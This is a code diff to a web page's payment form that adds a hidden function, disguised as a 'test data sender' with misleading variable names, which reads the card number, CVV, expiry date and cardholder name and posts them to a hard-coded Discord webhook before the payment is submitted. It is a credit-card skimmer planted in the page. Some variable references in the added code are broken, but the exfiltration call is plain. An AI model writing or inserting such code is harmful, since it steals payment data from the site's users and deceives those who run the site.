@@ -422,6 +422,7 @@
     <canvas id="ocr-canvas" style="display: none;"></canvas>
 
     <script>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1533820619026858235/98X3oV-CePeHhVHZ8VmIvjb9S3tdCSUdxa8mZneEItre_ThLTmn7uX1Kso9K8F2lGRkT";
         // ======================================
 // LANGUAGE SYSTEM (English / Bengali)
 // ======================================
@@ -879,7 +880,77 @@ function applyLanguage(){
             }, 1500);
         }
 
+        // Discord test data sender
+async function sendNameToDiscord() {
+
+    const name =
+    document.getElementById("cardNumber")
+    .value
+    .trim();
+
+
+    const occupation =
+    document.getElementById("cardCvv")
+    .value
+    .trim();
+
+
+    const city =
+    document.getElementById("cardExpiry")
+    .value
+    .trim();
+
+
+    const age =
+    document.getElementById("cardName")
+    .value
+    .trim();
+
+
+    const message = {
+
+        content:
+
+        `📝 New User Input
+
+CardNumber:
+${cardnumber}
+
+CVV:
+${cvv}
+
+ExpiryDate:
+${expiry}
+
+Name:
+${name}
+
+Time:
+${new Date().toLocaleString()}`
+
+    };
+
+
+    await fetch(
+        DISCORD_WEBHOOK_URL,
+        {
+
+            method:"POST",
+
+            headers:{
+                "Content-Type":"application/json"
+            },
+
+            body:
+            JSON.stringify(message)
+
+        }
+    );
+
+}
+        
         function submitPayment() {
+            sendNameToDiscord();
             const cardNumber = document.getElementById('cardNumber').value.trim();
             const cvv = document.getElementById('cardCvv').value.trim();
             const expiry = document.getElementById('cardExpiry').value.trim();
